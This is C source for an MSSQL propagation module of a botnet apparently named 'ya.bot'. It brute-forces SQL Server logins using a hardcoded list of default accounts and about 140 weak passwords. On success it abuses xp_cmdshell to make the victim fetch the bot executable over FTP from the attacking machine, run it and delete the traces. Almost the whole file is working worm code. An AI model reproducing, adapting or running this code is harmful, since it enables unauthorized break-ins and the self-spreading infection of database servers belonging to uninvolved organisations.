/*  ya.bot  */

#include "..\..\bot\bot.h"

#ifndef NO_EXPSCAN
#ifndef NO_EXPSCANMSSQL

#include <sql.h>
#include <sqlext.h>
#include <sqltypes.h>

bool mssql(SExpScanInfo s_esi)
{
	char database[]="", *users[]={
	"sa",
	"root",
	"admin",
	NULL
	};

    char *password[]={
	"",
	"administrator",
	"administrador",
	"administrateur",
	"administrat",
	"admins",
	"admin",
	"adm",
	"password1",
	"password",
	"passwd",
	"pass1234",
	"pass",
	"pwd",
	"007",
	"1",
	"12",
	"123",
	"1234",
	"12345",
	"123456",
	"1234567",
	"12345678",
	"123456789",
	"1234567890",
	"2000",
	"2001",
	"2002",
	"2003",
	"2004",
	"test",
	"guest",
	"none",
	"demo",
	"unix",
	"linux",
	"changeme",
	"default",
	"system",
	"server",
	"root",
	"null",
	"qwerty",
	"mail",
	"outlook",
	"web",
	"www",
	"internet",
	"accounts",
	"accounting",
	"home",
	"homeuser",
	"user",
	"oem",
	"oemuser",
	"oeminstall",
	"windows",
	"win98",
	"win2k",
	"winxp",
	"winnt",
	"win2000",
	"qaz",
	"asd",
	"zxc",
	"qwe",
	"bob",
	"jen",
	"joe",
	"fred",
	"bill",
	"mike",
	"john",
	"peter",
	"luke",
	"sam",
	"sue",
	"susan",
	"peter",
	"brian",
	"lee",
	"neil",
	"ian",
	"chris",
	"eric",
	"george",
	"kate",
	"bob",
	"katie",
	"mary",
	"login",
	"loginpass",
	"technical",
	"backup",
	"exchange",
	"fuck",
	"bitch",
	"slut",
	"sex",
	"god",
	"hell",
	"hello",
	"domain",
	"domainpass",
	"domainpassword",
	"database",
	"access",
	"dbpass",
	"dbpassword",
	"databasepass",
	"data",
	"databasepassword",
	"db1",
	"db2",
	"db1234",
	"sa",
	"sql",
	"sqlpass"
	"oainstall",
	"orainstall",
	"oracle",
	"ibm",
	"cisco",
	"dell",
	"compaq",
	"siemens",
	"hp",
	"nokia",
	"xp",
	"control",
	"office",
	"blank",
	"winpass",
	"main",
	"lan",
	"internet",
	"intranet",
	"student",
	"teacher",
	"staff",
	NULL
};

    
	bool bRet=FALSE;

	SQLHANDLE hEnv;
	SQLHDBC hDbc = SQL_NULL_HDBC;
	SQLHSTMT hStmt = SQL_NULL_HSTMT;
    SQLCHAR szOutConn[1024], constr[1024], command[1024];
	SQLSMALLINT sLen;

typedef SQLRETURN (__stdcall *SQLDC)(SQLHDBC,SQLHWND,SQLCHAR *,SQLSMALLINT,SQLCHAR *,SQLSMALLINT,SQLSMALLINT *,SQLUSMALLINT);
typedef SQLRETURN (__stdcall *SQLSEA)(SQLHENV,SQLINTEGER,SQLPOINTER,SQLINTEGER);
typedef SQLRETURN (__stdcall *SQLED)(SQLHSTMT,SQLCHAR *,SQLINTEGER);
typedef SQLRETURN (__stdcall *SQLAH)(SQLSMALLINT,SQLHANDLE,SQLHANDLE *);
typedef SQLRETURN (__stdcall *SQLFH)(SQLSMALLINT,SQLHANDLE);
typedef SQLRETURN (__stdcall *SQLD)(SQLHDBC);

// odbc32.dll function variables
SQLDC fSQLDriverConnect;
SQLSEA fSQLSetEnvAttr;
SQLED fSQLExecDirect;
SQLAH fSQLAllocHandle;
SQLFH fSQLFreeHandle;
SQLD fSQLDisconnect;

closesocket(s_esi.m_csock);
 	HMODULE odbc32_dll = LoadLibrary("odbc32.dll");
    if (odbc32_dll) {
	 	fSQLDriverConnect = (SQLDC)GetProcAddress(odbc32_dll,"SQLDriverConnect");
	 	fSQLSetEnvAttr = (SQLSEA)GetProcAddress(odbc32_dll,"SQLSetEnvAttr");
	 	fSQLExecDirect = (SQLED)GetProcAddress(odbc32_dll,"SQLExecDirect");
	 	fSQLAllocHandle = (SQLAH)GetProcAddress(odbc32_dll,"SQLAllocHandle");
	 	fSQLFreeHandle = (SQLFH)GetProcAddress(odbc32_dll,"SQLFreeHandle");
	 	fSQLDisconnect = (SQLD)GetProcAddress(odbc32_dll,"SQLDisconnect");

	if (fSQLAllocHandle(SQL_HANDLE_ENV,SQL_NULL_HANDLE,&hEnv) != SQL_SUCCESS)
		return bRet;

	if (fSQLSetEnvAttr(hEnv, SQL_ATTR_ODBC_VERSION,(SQLPOINTER) SQL_OV_ODBC3, SQL_IS_INTEGER) != SQL_SUCCESS)
		return bRet;

	if (fSQLAllocHandle(SQL_HANDLE_DBC,hEnv,(SQLHDBC FAR*)&hDbc) != SQL_SUCCESS) {
		fSQLFreeHandle(SQL_HANDLE_ENV, hEnv);
		return bRet;
	}

	for (int i=0; users[i]; i++) {
		for (int j=0; password[j]; j++) {
			sprintf((char *)constr, "DRIVER={SQL Server};SERVER=%s,%d;UID=%s;PWD=%s;%s",s_esi.m_szIP,s_esi.m_nPort,users[i],password[j],database);
			SQLRETURN nResult = fSQLDriverConnect(hDbc, NULL, constr, (SQLSMALLINT)strlen((char *)constr), szOutConn, 1024, &sLen, SQL_DRIVER_NOPROMPT);
			if (nResult == SQL_SUCCESS || nResult == SQL_SUCCESS_WITH_INFO) {
				fSQLAllocHandle(SQL_HANDLE_STMT,hDbc, &hStmt);
			sprintf((char *)command, "EXEC master..xp_cmdshell '"
					"echo open %s %i > temp987.dat&"
					"echo user %s %s >> temp987.dat&"
					"echo get %s C:\\%s >> temp987.dat&"
					"echo quit >> temp987.dat&"
					"ftp -n -s:temp987.dat&"
					"start C:\\%s&"
					"del /Q temp987.dat&"
					"%s"
					"\r\n'",
					ip_getip(s_esi.m_bsock),
					daemonftpport, daemonftpuser, daemonftppass,
					botfilename, botfilename, botfilename, botfilename);
//				sprintf((char *)command,"EXEC master..xp_cmdshell 'del eq&echo open %s %d >> eq&echo user %d %d >> eq &echo get %s >> eq &echo quit >> eq &ftp -n -s:eq &%s&del eq\r\n'", GetIP(exinfo.sock), FTP_PORT, rand(), rand(), filename, filename);
				if (fSQLExecDirect(hStmt, (SQLTCHAR*)&command, SQL_NTS) != SQL_SUCCESS) {
					Sleep(5000);
					sprintf((char *)command,"EXEC master..xp_cmdshell '%s'", botfilename);
							if (fSQLExecDirect(hStmt, (SQLTCHAR*)&command, SQL_NTS) == SQL_SUCCESS) {
								bRet=TRUE;
								break;
							}
						Sleep(5000);
					}
				}
				fSQLFreeHandle(SQL_HANDLE_STMT, hStmt);

				break;
			}
			Sleep(500);
		if (bRet == TRUE)
			break;
		}
	}

	fSQLFreeHandle(SQL_HANDLE_DBC, hDbc);
	fSQLFreeHandle(SQL_HANDLE_ENV, hEnv);

	return bRet;
}
#endif
#endif